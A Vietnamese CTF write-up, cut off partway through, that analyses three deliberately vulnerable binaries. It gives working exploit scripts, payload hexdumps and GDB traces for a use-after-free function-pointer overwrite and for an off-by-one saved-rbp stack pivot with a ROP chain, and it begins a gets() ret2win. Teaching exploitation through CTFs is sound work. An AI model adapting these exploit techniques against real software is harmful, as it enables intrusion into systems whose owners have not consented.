---
title: '[CSSCTF] PWN / Binary Exploitation Challenges Writeup'
date: '2026-10-02'
description: Writeup chi tiết các thử thách khai thác nhị phân (Binary Exploitation
  / PWN) trong CSSCTF.
categories: [CSSCTF, Pwn]
tags: [cssctf, pwn, binary-exploitation, buffer-overflow, rop]
series: [CSSCTF 2026]
showAuthor: false
showTableOfContents: true
---

# [CSSCTF] PWN / Binary Exploitation Challenges Writeup

**Tác giả:** k0z1l
**Thể loại:** Binary Exploitation (PWN)  
**Định dạng Flag:** `CSSCTF{...}`

---

## Mục lục
1. [Dockside Ticket Office](#1-dockside-ticket-office)
   - [1.0. TL;DR & Tóm tắt khai thác](#10-tldr--tóm-tắt-khai-thác)
   - [1.1. Thông tin file & Cơ chế bảo vệ](#11-thông-tin-file--cơ-chế-bảo-vệ)
   - [1.2. Bảng Symbol](#12-bảng-symbol)
   - [1.3. Reverse & Phân tích chi tiết từng hàm](#13-reverse--phân-tích-chi-tiết-từng-hàm)
   - [1.4. Phân tích lỗ hổng Use-After-Free](#14-phân-tích-lỗ-hổng-use-after-free)
   - [1.5. Đường đi khai thác (Exploit Primitive)](#15-đường-đi-khai-thác-exploit-primitive)
   - [1.6. Các cách giải & Script khai thác](#16-các-cách-giải--script-khai-thác)
   - [1.7. Cạm bẫy kỹ thuật: Buffer stdio vs Syscall `read(2)`](#17-cạm-bẫy-kỹ-thuật-buffer-stdio-vs-syscall-read2)
   - [1.8. Kiểm chứng bằng GDB](#18-kiểm-chứng-bằng-gdb)
   - [1.9. Tổng kết & Flag](#19-tổng-kết--flag)
2. [Maintenance Log](#2-maintenance-log)
   - [2.0. TL;DR & Tóm tắt khai thác](#20-tldr--tóm-tắt-khai-thác)
   - [2.1. Thông tin file & Cơ chế bảo vệ](#21-thông-tin-file--cơ-chế-bảo-vệ)
   - [2.2. Bản đồ hàm & Phân tích chuỗi string](#22-bản-đồ-hàm--phân-tích-chuỗi-string)
   - [2.3. Disassembly có chú thích](#23-disassembly-có-chú-thích)
   - [2.4. Phân tích Stack Layout & Khoảng cách bộ nhớ](#24-phân-tích-stack-layout--khoảng-cách-bộ-nhớ)
   - [2.5. Cơ chế `leave` & Kỹ thuật Stack Pivot 1-byte](#25-cơ-chế-leave--kỹ-thuật-stack-pivot-1-byte)
   - [2.6. Tìm kiếm ROP Gadget](#26-tìm-kiếm-rop-gadget)
   - [2.7. Cạm bẫy kỹ thuật: Tại sao không được nhảy vào giữa hàm win?](#27-cạm-bẫy-kỹ-thuật-tại-sao-không-được-nhảy-vào-giữa-hàm-win)
   - [2.8. Script khai thác hoàn chỉnh (Local & Remote)](#28-script-khai-thác-hoàn-chỉnh-local--remote)
   - [2.9. Kiểm chứng bằng GDB & Transcript](#29-kiểm-chứng-bằng-gdb--transcript)
   - [2.10. Tổng kết & Flag](#210-tổng-kết--flag)
3. [Kuiper Belt Relay Core](#3-kuiper-belt-relay-core)
   - [3.1. Mô tả thử thách & Dữ kiện](#31-mô-tả-thử-thách--dữ-kiện)
   - [3.2. Phân tích mã nguồn & Xác định lỗ hổng (Vulnerability Analysis)](#32-phân-tích-mã-nguồn--xác-định-lỗ-hổng-vulnerability-analysis)
   - [3.3. Mô hình bộ nhớ Stack & Kỹ thuật ret2win](#33-mô-hình-bộ-nhớ-stack--kỹ-thuật-ret2win)
   - [3.4. Phương pháp xác định địa chỉ mục tiêu (Target Discovery)](#34-phương-pháp-xác-định-địa-chỉ-mục-tiêu-target-discovery)
   - [3.5. Mã nguồn khai thác hoàn chỉnh (Python / Pwntools)](#35-mã-nguồn-khai-thác-hoàn-chỉnh-python--pwntools)
   - [3.6. Kết quả thực thi & Flag](#36-kết-quả-thực-thi--flag)
   - [3.7. Biện pháp phòng chống & Khắc phục lỗ hổng (Remediation)](#37-biện-pháp-phòng-chống--khắc-phục-lỗ-hổng-remediation)

---

## 1. Dockside Ticket Office

> **Flag:** `CSSCTF{us3_4ft3r_fr33_d0cks1d3}`  
> **Bug:** **Use-After-Free** (`free` nhưng không NULL con trỏ toàn cục) $\rightarrow$ ghi đè **con trỏ hàm** trong struct đã free $\rightarrow$ gọi `open_gate()` để in flag.  
> **Đặc điểm:** Không cần leak, không cần canary, không cần tcache magic: binary **non-PIE** nên mọi địa chỉ là hằng số.

---

### 1.0. TL;DR & Tóm tắt khai thác

```text
1. Create ticket      -> malloc(0x28); struct *t;  t->fn = deny_access
2. Cancel ticket      -> free(t)          <-- global t KHÔNG bị set NULL  => UAF
3. Edit ticket        -> read(0, t, 0x28) <-- ghi đè vùng nhớ đã free (UAF write)
                         payload = b'A'*0x20 + p64(0x40125f)   # fn = open_gate
4. Use ticket         -> call *(t+0x20)   ==> open_gate()  in "CSSCTF{...}"
```

Payload gửi cho `Edit`: đúng **0x28 = 40 byte**.

```text
00000000: 4141 4141 4141 4141 4141 4141 4141 4141   A...............
00000010: 4141 4141 4141 4141 4141 4141 4141 4141   ................
00000020: 5f12 4000 0000 0000                        _.@.....   <-- 0x40125f
```

---

### 1.1. Thông tin file & Cơ chế bảo vệ

```console
$ file dockside_ticket
ELF 64-bit LSB executable, x86-64, dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2,
for GNU/Linux 3.2.0, not stripped
```

| Thuộc tính | Giá trị | Ý nghĩa |
|---|---|---|
| Type | `EXEC` | **Không PIE** $\rightarrow$ địa chỉ code cố định (`0x401150`, `0x40125f`…) $\rightarrow$ hardcode được, **không cần leak** |
| NX | `GNU_STACK RW` | NX bật $\rightarrow$ không nhét shellcode lên stack |
| RELRO | `GNU_RELRO` + không có `BIND_NOW` | Partial RELRO $\rightarrow$ GOT ghi được (nhưng bài này không cần) |
| Canary | chỉ ở `main` (`mov rax, fs:0x28`) | Các hàm menu **không** có canary $\rightarrow$ không liên quan |
| Symbols | `not stripped` | Còn `open_gate`, `deny_access`, `active_ticket` $\rightarrow$ đọc code rất nhanh |
| Build | `GCC 13.3.0-6ubuntu2~24.04.1` | Ubuntu 24.04 $\Rightarrow$ glibc 2.39 |

*Lưu ý về canary:* `main` có stack canary, nhưng lỗi của bài **không nằm trên stack** $\rightarrow$ không cần quan tâm.

---

### 1.2. Bảng Symbol (lấy từ `readelf -sW`)

| Địa chỉ | Tên | Vai trò |
|---|---|---|
| `0x401236` | `deny_access` | in "Ticket scanned." + "Access denied…" |
| `0x40125f` | **`open_gate`** | in "Ticket scanned." + "Emergency harbour access granted." + **`puts(flag)`** |
| `0x401297` | `print_banner` | banner |
| `0x4012de` | `menu` | in menu |
| `0x401357` | `create_ticket` | `malloc(0x28)` + khởi tạo |
| `0x4013c3` | `cancel_ticket` | **`free()` — thủ phạm** |
| `0x401408` | `edit_ticket` | **`read(0, ptr, 0x28)` — UAF write** |
| `0x401466` | `use_ticket` | **`call *(ptr+0x20)` — UAF call** |
| `0x40149f` | `main` | vòng lặp menu |
| `0x404068` | `active_ticket` | con trỏ toàn cục tới ticket |
| `0x402088` | *(rodata)* | chuỗi `"CSSCTF{us3_4ft3r_fr33_d0cks1d3}"` |

---

### 1.3. Reverse & Phân tích chi tiết từng hàm

#### 1.3.1. Struct `ticket`
`create_ticket` cấp phát `malloc(0x28)`:

```asm
40137c:  mov  edi,0x28                 ; size = 40
401381:  call malloc@plt
401386:  mov  [rip+0x2cdb],rax         ; active_ticket = t
401394:  mov  DWORD PTR [rax],0x53455547    ; "GUES"
40139a:  mov  WORD  PTR [rax+0x4],0x54      ; "T\0"
4013a7:  lea  rdx,[rip-0x17a]               ; = 0x401236 (deny_access)
4013ae:  mov  QWORD PTR [rax+0x20],rdx      ; t->fn = deny_access
```

Suy ra layout (C):

```c
struct ticket {                 /* malloc(0x28) -> chunk 0x30, tcache idx 1 */
    char name[8];               /* +0x00  "GUEST\0\0\0"        */
    /* 8 byte không khởi tạo */ /* +0x08                        */
    /* 16 byte không khởi tạo */ /* +0x10 .. +0x1f               */
    void (*fn)(void);           /* +0x20  = &deny_access        */
};                              /* +0x28 = hết vùng user        */
struct ticket *active_ticket;   /* global @ 0x404068            */
```

Chỉ 2 vùng được ghi khi tạo: `+0x00` (tên) và `+0x20` (con trỏ hàm). 20 byte ở giữa là **rác của malloc** (không zero) — nhưng `edit` đọc đủ 40 byte nên ta kiểm soát toàn bộ.

#### 1.3.2. `create_ticket` (0x401357)

```c
void create_ticket(void) {
    if (active_ticket) { puts("A ticket already exists."); return; }
    active_ticket = malloc(0x28);
    strcpy(active_ticket->name, "GUEST");
    active_ticket->fn = deny_access;           // 0x401236
    puts("Ticket created for GUEST.");
}
```

$\rightarrow$ **Điểm chốt:** Chỉ được tạo **một** ticket duy nhất. Vì `active_ticket` không bao giờ bị set về `NULL`, `malloc` **không bao giờ được gọi lần thứ 2** $\Rightarrow$ không thể double-free / tcache poisoning $\Rightarrow$ hướng khai thác phải là *dùng chính con trỏ treo*.

#### 1.3.3. `cancel_ticket` (0x4013c3) — LỖI

```asm
4013cb:  mov rax,[rip+0x2c96]     ; rax = active_ticket
4013d2:  test rax,rax
4013d5:  jne 0x4013e8
4013d7:  lea rax,[rip+0xdae]      ; "No active ticket."
4013e1:  call puts@plt
4013e6:  jmp 0x401406
4013e8:  mov rax,[rip+0x2c79]     ; rax = active_ticket
4013ef:  mov rdi,rax
4013f2:  call free@plt            ; <-- FREE
4013f7:  lea rax,[rip+0xdae]      ; "Ticket cancelled."
401401:  call puts@plt
```

```c
void cancel_ticket(void) {
    if (!active_ticket) { puts("No active ticket."); return; }
    free(active_ticket);                 // <-- active_ticket vẫn giữ địa chỉ cũ
    puts("Ticket cancelled.");           //     KHÔNG hề có  active_ticket = NULL;
}
```

$\rightarrow$ **Use-After-Free kinh điển.** Sau bước này:
* `active_ticket` $\rightarrow$ chunk **đã được trả về tcache bin size 0x30**.
* 8 byte đầu vùng user = `tcache->entries[1]` (`NULL` vì bin rỗng) — đúng kiểu "giờ thì ticket không còn hợp lệ".

#### 1.3.4. `edit_ticket` (0x401408)

```asm
401410:  mov  rax,[rip+0x2c51]     ; rax = active_ticket (con trỏ treo!)
401417:  test rax,rax
40141a:  jne  0x40142d
40141c:  ... "No active ticket."
40142d:  lea  rax,[rip+0xd8a]      ; "Enter new ticket data:"
401437:  call puts@plt
40143c:  mov  rax,[rip+0x2c25]     ; rax = active_ticket
401443:  mov  edx,0x28             ; len = 0x28
401448:  mov  rsi,rax              ; buf = active_ticket   <== ĐÍCH GHI
40144b:  mov  edi,0x0              ; fd = 0 (stdin)
401450:  call read@plt             ; read(0, active_ticket, 0x28)
401455:  ... "Ticket updated."
```

```c
void edit_ticket(void) {
    if (!active_ticket) { puts("No active ticket."); return; }
    puts("Enter new ticket data:");
    read(0, active_ticket, 0x28);     // <-- UAF WRITE, ghi vào chunk đã free
    puts("Ticket updated.");
}
```

Vì sao 0x28 byte là *vừa đủ*:
* Vùng user = `0x00 … 0x27`; cần với tới `+0x20` $\Rightarrow$ chỉ cần 40 byte $\Rightarrow$ **không cần overflow** gì cả, `read` "hợp lệ" 100% theo thiết kế.
* `read` **không thêm `\0`**, không quan tâm nội dung $\Rightarrow$ ghi được cả byte NUL (địa chỉ 64-bit luôn chứa NUL) — điều mà `fgets`/`scanf("%s")` không làm được.

#### 1.3.5. `use_ticket` (0x401466) — Điểm nổ

```asm
40146e:  mov  rax,[rip+0x2bf3]     ; rax = active_ticket (treo)
401475:  test rax,rax
401478:  jne  0x40148b
40147a:  ... "No active ticket."
40148b:  mov  rax,[rip+0x2bd6]     ; rax = active_ticket
401492:  mov  rdx,[rax+0x20]       ; rdx = t->fn      <== đọc từ chunk đã free
401496:  mov  eax,0x0
40149b:  call rdx                  ; <== GỌI HÀM QUA CON TRỎ TRONG HEAP
```

```c
void use_ticket(void) {
    if (!active_ticket) { puts("No active ticket."); return; }
    active_ticket->fn();            // indirect call
}
```

$\rightarrow$ **Primitive hoàn hảo**: một lần gọi hàm (không tham số) tới **bất kỳ địa chỉ nào ta chọn** (giá trị nạp vào `+0x20`).

#### 1.3.6. Hàm "win" — `open_gate` (0x40125f)

```asm
40125f <open_gate>:
  puts(0x402008)   ; "Ticket scanned."
  puts(0x402060)   ; "Emergency harbour access granted."
  puts(0x402088)   ; <-- CHUỖI FLAG trong .rodata
  ret
```

**Kết luận:** Chỉ cần biến con trỏ hàm từ `deny_access` (`0x401236`) thành `open_gate` (`0x40125f`) là xong.

---

### 1.4. Phân tích lỗ hổng Use-After-Free

| # | Điều kiện | Có trong bài? |
|---|---|---|
| 1 | Vùng nhớ được `free` nhưng con trỏ vẫn dùng được | ✅ `cancel_ticket` không NULL hoá `active_ticket` |
| 2 | Có đường **ghi** vào vùng đã free | ✅ `edit_ticket` $\rightarrow$ `read(0, ptr, 0x28)` |
| 3 | Vùng đã free chứa thứ "có sức mạnh" | ✅ `+0x20` là **function pointer** được `call` |
| 4 | Biết đích để ghi | ✅ **non-PIE** $\Rightarrow$ `open_gate = 0x40125f` (hằng số) |
| 5 | Ghi được byte NUL | ✅ `read(2)` thô |

Không cần: leak libc, leak heap, bypass canary, bypass ASLR, ROP, SROP. **Toàn bộ exploit = 40 byte.**

---

### 1.5. Đường đi khai thác (Exploit Primitive)

```text
[+] Create  -> malloc(0x28)         active_ticket = 0x406xxx (heap sau .bss)
                                    [0x00]="GUEST"  [0x20]=0x401236 deny_access
[+] Cancel  -> free(active_ticket)  chunk vào tcache 0x30, CON TRỎ VẪN SỐNG  (UAF)
[+] Edit    -> read(0, 0x406xxx, 0x28)
                payload: 32 x 'A'  +  p64(0x40125f)
                (đầy đủ thì ghi luôn cả tcache next/key ở +0x00/+0x08, không sao)
[+] Use     -> call *(0x406xxx+0x20) == 0x40125f == open_gate
                                    ==> "Emergency harbour access granted."
                                        CSSCTF{us3_4ft3r_fr33_d0cks1d3}
```

---

### 1.6. Các cách giải & Script khai thác

#### Cách 1 — Script Python đầy đủ (Local & Remote)

```python
#!/usr/bin/env python3
# Dockside Ticket Office  --  use-after-free -> open_gate()
import os, sys, struct, select, subprocess, time

BIN       = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dockside_ticket")
OPEN_GATE = 0x40125f                      # .text: puts("...granted."); puts(flag)
p64 = lambda x: struct.pack("<Q", x)
PAYLOAD = b"B" * 0x20 + p64(OPEN_GATE)    # đúng 0x28 byte cho read(0, ptr, 0x28)

class IO:
    def __init__(self, p):
        self.p = p
        os.set_blocking(p.stdout.fileno(), False)
        self.buf = b""
    def recv_until(self, needle, timeout=5.0):
        end = time.time() + timeout
        while needle not in self.buf and time.time() < end:
            r, _, _ = select.select([self.p.stdout], [], [], 0.2)
            if r:
                try: c = os.read(self.p.stdout.fileno(), 4096)
                except BlockingIOError: continue
                if not c: break
                self.buf += c
        i = self.buf.find(needle)
        if i >= 0:
            out, self.buf = self.buf[:i+len(needle)], self.buf[i+len(needle):]
        else:
            out, self.buf = self.buf, b""
        sys.stdout.write(out.decode(errors="replace")); sys.stdout.flush()
        return out
    def send(self, b):
        self.p.stdin.write(b); self.p.stdin.flush()

def main(host=None, port=None):
    if host:                                    # --- remote ---
        import socket
        s = socket.create_connection((host, port)); s.setblocking(False)
        class P:
            def __init__(s_): s_.stdin = s; s_.stdout = s
        io = IO(P())
    else:                                       # --- local ---
        p = subprocess.Popen([BIN], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        io = IO(p)

    io.recv_until(b"> ")              # menu
    io.send(b"1\n")                   # 1. create
    io.recv_until(b"> ")
    io.send(b"2\n")                   # 2. cancel -> free(), con trỏ treo
    io.recv_until(b"> ")
    io.send(b"3\n")                   # 3. edit
    io.recv_until(b"data:")           # đợi read(2) thô đang chờ
    io.send(PAYLOAD)                  #    ghi đè fn @ +0x20 = open_gate
    io.recv_until(b"> ")
    io.send(b"4\n")                   # 4. use -> call *(ptr+0x20) = open_gate()
    io.recv_until(b"granted.")
    io.recv_until(b"> ", timeout=2)
    io.send(b"5\n")

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else None
    port = int(sys.argv[2]) if len(sys.argv) > 2 else None
    main(host, port)
```

#### Cách 2 — Bash one-liner

```bash
{
  echo 1; sleep 0.2
  echo 2; sleep 0.2
  echo 3; sleep 0.2
  python3 -c "import sys,struct; sys.stdout.buffer.write(b'A'*0x20+struct.pack('<Q',0x40125f))"
  sleep 0.2
  echo 4; sleep 0.3
  echo 5
} | ./dockside_ticket
```

---

### 1.7. Cạm bẫy kỹ thuật: Buffer stdio vs Syscall `read(2)`

* `main` đọc lựa chọn bằng `__isoc99_scanf("%d", &opt)` $\rightarrow$ `scanf` đi qua **stdio buffer của glibc**.
* `getchar()` sau đó cũng lấy từ buffer đó.
* Nhưng `edit_ticket` gọi `read(2)` — **syscall thô, bỏ qua stdio**.

Khi lần `scanf` đầu tiên chạy, glibc `read()` một phát **cả khối 4096 byte** từ pipe/socket vào FILE buffer. Nếu bơm hết input một lượt, **toàn bộ payload đã bị stdio nuốt**, pipe rỗng:

| Cách bơm input | Triệu chứng |
|---|---|
| Bơm hết một lượt, stdin là pipe còn mở | `read(2)` trong `edit` **BLOCK vĩnh viễn** $\rightarrow$ treo |
| Bơm hết một lượt rồi đóng stdin (EOF) | `read(2)` trả `0` $\rightarrow$ payload **không được ghi** $\rightarrow$ menu sau đó in `Invalid input.` |
| Gửi từng bước, đợi prompt | ✅ chạy đúng |

**Quy tắc:** gửi 1 lựa chọn $\rightarrow$ `recv_until("> ")` $\rightarrow$ mới gửi bước kế; và với payload thì `recv_until("Enter new ticket data:")` rồi mới ghi 40 byte.

---

### 1.8. Kiểm chứng bằng GDB

```console
Breakpoint 1, 0x000000000040148b in use_ticket ()
rax = 0x406020   (chunk user data)
0x406020: 0x4141414141414141  0x4141414141414141
0x406030: 0x4141414141414141  0x4141414141414141
0x406040: 0x000000000040125f  0x0000000000000301
Breakpoint 2, 0x000000000040149b in use_ticket ()
tai call rdx: rdx = 0x40125f
0x000000000040125f in open_gate ()
sau si: rip = 0x40125f  ==> open_gate
```

---

### 1.9. Tổng kết & Flag

| Thuộc tính | Chi tiết |
|---|---|
| **Lỗi** | Use-After-Free (`free` không NULL hoá con trỏ toàn cục) |
| **Primitive** | Ghi 0x28 byte vào chunk đã free (UAF write) + gọi hàm qua con trỏ trong chunk (UAF call) |
| **Win Address** | `fn = open_gate (0x40125f)` |
| **Flag** | **`CSSCTF{us3_4ft3r_fr33_d0cks1d3}`** |

---
---

## 2. Maintenance Log

> **Flag:** `CSSCTF{Duh_m4t3_1_4m_sl33py}`  
> **Server:** `nc 34.116.80.78 7312`  
> **Bug:** `read(0, token, 0x21)` ghi vào buffer `0x20` $\rightarrow$ byte thứ 33 rơi đúng **byte thấp của saved rbp của frame cha** $\rightarrow$ `leave` của frame cha biến thành **stack pivot 1 byte** vào chính buffer báo cáo (đã được `printf("%p")` **leak địa chỉ**).  
> **Win:** `func_auth(0xdeadbeef, 0xcafebabe)` @ `0x401268` $\rightarrow$ `fopen("flag.txt")` $\rightarrow$ in flag.  
> **Đặc điểm:** Không cần phá canary (đường win gọi `exit()` trước khi check), không cần leak PIE/libc (binary non-PIE).

---

### 2.0. TL;DR & Tóm tắt khai thác

```text
0. Nhận leak:  [*] Report buffer allocated at: 0x7fff....   -> buf
1. read#1 (0x50 byte vào buf):  chain nằm ngay đầu buf
       buf+0x00: 0x00007ffc....      <- rbp "giả" (địa chỉ writable như buf)
       buf+0x08: 0x000000000040124d  <- pop rdi ; ret
       buf+0x10: 0x00000000deadbeef  <- rdi
       buf+0x18: 0x000000000040124f  <- pop rsi ; ret
       buf+0x20: 0x00000000cafebabe  <- rsi
       buf+0x28: 0x0000000000401268  <- func_auth -> in flag
2. read#2 (0x21 byte vào token 0x20): 32 byte rác + 1 byte cuối = (pivot & 0xff)
3. func_tag.leave;ret  -> return bình thường (retaddr không bị đụng)
4. func_report.leave   -> rsp = (rbp_report & ~0xff) | pivot_byte = buf   ==> PIVOT
5. pop rbp; ret        -> chạy chain -> func_auth(0xdeadbeef, 0xcafebabe)
6. [+] Access Granted! Here is your flag:  CSSCTF{...}
```

Payload mẫu:

```text
00000000: 20e1 ffff ff7f 0000 4d12 4000 0000 0000   .......M.@.....   <- buf (rbp giả)
00000010: efbe adde 0000 0000 4f12 4000 0000 0000   ........O.@.....   <- pop rdi / 0xdeadbeef
00000020: beba feca 0000 0000 6812 4000 0000 0000   ........h.@.....   <- pop rsi / 0xcafebabe / func_auth
00000030: 4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAA...         <- pad tới 0x50
00000040: 4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAA...
00000050: 4242 4242 4242 4242 4242 4242 4242 4242   BBBBBBB...         <- read#2: token[0x20]
00000060: 4242 4242 4242 4242 4242 4242 4242 4242   BBBBBBB...
00000070: 20                                        .                  <- byte 33 = 0x20 (pivot & 0xff)
```

---

### 2.1. Thông tin file & Cơ chế bảo vệ

```console
$ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
       dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
       BuildID[sha1]=5dc6c7d1..., for GNU/Linux 3.2.0, stripped
```

| Thuộc tính | Giá trị | Ý nghĩa |
|---|---|---|
| Type | `EXEC` | **Non-PIE** $\rightarrow$ `0x401268`, `0x40124d`, `0x40124f`… là hằng số |
| NX | `GNU_STACK RW` | NX bật $\rightarrow$ không dùng shellcode |
| RELRO | `GNU_RELRO`, không `BIND_NOW` | Partial RELRO (GOT ghi được) |
| Canary | **CÓ** | Có mặt ở `main`, `func_auth`. **`func_report` và `func_tag` KHÔNG có canary** |
| Symbols | `stripped` | Không còn tên hàm, phải disasm |

---

### 2.2. Bản đồ hàm & Phân tích chuỗi string

| Địa chỉ | Tên tự đặt | Vai trò |
|---|---|---|
| `0x4011b6` | `setup_buffers` | `setvbuf(stdin/stdout/stderr, NULL, _IONBF, 0)` |
| `0x40139a` | **`func_report`** | in leak, `memset(buf,0,0x50)`, `read(0, buf, 0x50)`, gọi `func_tag` |
| `0x401348` | **`func_tag`** 🐛 | `memset(token,0,0x20)`, `len = 0x21`, `read(0, token, 0x21)` $\rightarrow$ **overflow 1 byte** |
| `0x401268` | **`func_auth`** 🏁 | `if (edi==0xdeadbeef && esi==0xcafebabe)` $\rightarrow$ đọc & in `flag.txt` |
| `0x401419` | `main` | gọi `setup_buffers`, in banner, gọi `func_report`, in "Log finalized." |

---

### 2.3. Disassembly có chú thích

#### 2.3.1. `func_report` @ `0x40139a` (Nguồn leak)
```asm
40139a: push rbp
40139b: mov  rbp,rsp
40139e: sub  rsp,0x50                   ; buf = rbp-0x50 (KHÔNG có canary)
4013b8: lea  rax,[rbp-0x50]
4013bc: mov  rsi,rax
4013c9: call printf                     ; printf("[*] Report buffer allocated at: %p\n", buf)
4013eb: mov  edx,0x50
4013f8: call read                       ; read(0, buf, 0x50) (80 bytes)
401402: call 0x401348                   ; func_tag()
401417: leave
401418: ret                             ; <== nơi bị pivot bởi 1 byte
```

#### 2.3.2. `func_tag` @ `0x401348` (Lỗ hổng 1 byte)
```asm
401348: push rbp
401349: mov  rbp,rsp
40134c: sub  rsp,0x30
401350: lea  rax,[rbp-0x20]             ; token = rbp-0x20 (32 bytes)
40137a: mov  QWORD PTR [rbp-0x28],0x21  ; len = 0x21 = 33  (buffer chỉ 32)
401382: mov  rdx,[rbp-0x28]
401392: call read                       ; read(0, token, 33) => byte 33 ghi đè saved rbp!
401398: leave ; ret
```

#### 2.3.3. `func_auth` @ `0x401268` (Đường Win)
```asm
401285: cmp DWORD PTR [rbp-0x64],0xdeadbeef ; kiểm tra tham số 1 (rdi)
401292: cmp DWORD PTR [rbp-0x68],0xcafebabe ; kiểm tra tham số 2 (rsi)
4012c2: call fopen                      ; fopen("flag.txt", "r")
4012fb: call fgets                      ; đọc flag
401307: call puts                       ; in flag
40131d: call exit                       ; exit(0) - không bao giờ check canary!
```

---

### 2.4. Phân tích Stack Layout & Khoảng cách bộ nhớ

| Biến | Công thức |
|---|---|
| `buf` | Được leak từ `printf` |
| `rbp_report` | `buf + 0x50` |
| `rbp_tag` | `rbp_report - 0x60` |
| `token` | `rbp_report - 0x80` (32 byte) |
| byte 33 của read#2 | Ghi đè vào byte thấp của `rbp_report` |

---

### 2.5. Cơ chế `leave` & Kỹ thuật Stack Pivot 1-byte

Khi `func_report` thực hiện `leave`:
```asm
mov rsp, rbp      ; rsp = (rbp_report & ~0xff) | our_byte   <== STACK PIVOT
pop rbp           ; rbp = [rsp], rsp += 8
ret               ; rip = [rsp] (chạy ROP chain)
```

Đặt `pivot = max(buf, block_base)`, đưa ROP chain vào vị trí tương ứng trong `buf`.

---

### 2.6. Tìm kiếm ROP Gadget

Trích xuất 2 gadget chuẩn từ `.text`:
* `0x40124d`: `pop rdi ; ret` $\rightarrow$ nạp `0xdeadbeef`
* `0x40124f`: `pop rsi ; ret` $\rightarrow$ nạp `0xcafebabe`

---

### 2.7. Cạm bẫy kỹ thuật: Tại sao không được nhảy vào giữa hàm win?

Nếu nhảy vào `0x40129f` (bỏ qua check `deadbeef`/`cafebabe`):
- Bỏ qua lệnh `mov QWORD PTR [rbp-0x58], rax` (lưu con trỏ `FILE*`).
- `fgets` sau đó sẽ đọc `[rbp-0x58]` (chứa rác) $\rightarrow$ **SIGSEGV Crash ngay lập tức**.
- **Bài học:** Phải nhảy vào đầu hàm `func_auth` (`0x401268`) và thiết lập đầy đủ 2 thanh ghi `rdi`, `rsi`.

---

### 2.8. Script khai thác hoàn chỉnh (Local & Remote)

```python
#!/usr/bin/env python3
# CSSCTF "Maintenance Log" Exploit
import os, sys, struct, socket

POP_RDI = 0x40124d
POP_RSI = 0x40124f
AUTH    = 0x401268
BUF_OFF = 0x50
CHAIN_LEN = 48
HOST, PORT = "34.116.80.78", 7312

def build(buf):
    rbp_report = buf + BUF_OFF
    pivot = max(buf, rbp_report & ~0xff)
    if buf + BUF_OFF - pivot < CHAIN_LEN:
        return None
    chain  = struct.pack("<Q", buf)           # rbp giả
    chain += struct.pack("<Q", POP_RDI)
    chain += struct.pack("<Q", 0xdeadbeef)
    chain += struct.pack("<Q", POP_RSI)
    chain += struct.pack("<Q", 0xcafebabe)
    chain += struct.pack("<Q", AUTH)
    p1 = bytearray(b"A" * BUF_OFF)
    p1[pivot - buf:pivot - buf + CHAIN_LEN] = chain
    p2 = b"B" * 0x20 + bytes([pivot & 0xff])
    return bytes(p1), p2, pivot

def main():
    while True:
        s = socket.create_connection((HOST, PORT))
        data = s.recv(1024).decode()
        addr_str = data.split("allocated at: ")[1].split("\n")[0]
        buf = int(addr_str, 16)
        res = build(buf)
        if not res:
            s.close()
            continue
        p1, p2, pivot = res
        s.sendall(p1)
        s.sendall(p2)
        resp = s.recv(4096).decode(errors="replace")
        print(resp)
        s.close()
        break

if __name__ == "__main__":
    main()
```

---

### 2.9. Kiểm chứng bằng GDB & Transcript

```console
Breakpoint 2, 0x0000000000401417 in ?? ()
0x7fffffffe120:	0x00007fffffffe120	0x000000000040124d
0x7fffffffe130:	0x00000000deadbeef	0x000000000040124f
0x7fffffffe140:	0x00000000cafebabe	0x0000000000401268

[3] after leave: rsp=0x7fffffffe128  rbp(new)=0x7fffffffe120
[4] after ret : rip=0x40124d  (pop rdi;ret)
[+] Access Granted! Here is your flag:
CSSCTF{Duh_m4t3_1_4m_sl33py}
```

---

### 2.10. Tổng kết & Flag

| Thuộc tính | Chi tiết |
|---|---|
| **Lỗi** | Off-by-one ghi đè 1 byte lên byte thấp của saved RBP |
| **Hỗ trợ** | Leak địa chỉ Stack qua `printf("%p")` |
| **Kỹ thuật** | 1-byte Stack Pivot via `leave` + ROP chain 2 đối số |
| **Flag** | **`CSSCTF{Duh_m4t3_1_4m_sl33py}`** |

---
---

## 3. Kuiper Belt Relay Core

> **Flag:** `CSSCTF{s1gn4l_r3c0v3r3d_fr0m_th3_v01d}`  
> **Server:** `nc 34.116.80.78 9998` · File đính kèm: `echo.c`  
> **Bug:** Tràn bộ đệm cổ điển (Buffer Overflow) qua hàm không an toàn `gets(buffer)`.  
> **Win:** Chuyển hướng luồng thực thi (ret2win) trực tiếp vào hàm chưa từng được gọi `win()` @ `0x401216`.

---

### 3.1. Mô tả thử thách & Dữ kiện

> **Mô tả:**  
> *The Relay rebooted an old diagnostic process — it just echoes back whatever you send it. Simple by design.*  
> *But it's still carrying dead code from before the blackout: a function that's never called, sitting untouched in memory. Redirect the program into it.*  
>  
> **Dữ kiện đính kèm:** `echo.c`  
> **Thông tin kết nối:** `nc 34.116.80.78 9998`  
> **Định dạng Flag:** `CSSCTF{...}`

---

### 3.2. Phân tích mã nguồn & Xác định lỗ hổng (Vulnerability Analysis)

Mã nguồn C được cung cấp (`echo.c`):

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void win() {
    printf("\nYou hijacked the return address!\n");
    printf("Here's your flag:\n");
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("Error: flag.txt not found on server.\n");
        exit(1);
    }
    char flag[128];
    if (fgets(flag, sizeof(flag), f)) {
        printf("%s\n", flag);
    }
    fclose(f);
    exit(0);
}

void vuln() {
    char buffer[64];
    printf("This program is a simple echo service.\n");
    printf("Enter your message: ");
    gets(buffer);  // VULNERABLE: no bounds checking!
    printf("You said: %s\n", buffer);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    printf("Goodbye!\n");
    return 0;
}
```

1. **Hàm `win()` (Dead Code):**
   - Đọc file `flag.txt` và in trực tiếp nội dung flag ra `stdout`.
   - Không được gọi trong luồng thực thi thông thường.

2. **Hàm `vuln()` (Điểm tràn bộ đệm):**
   - Khai báo mảng ký tự cục bộ: `char buffer[64];` (64 bytes).
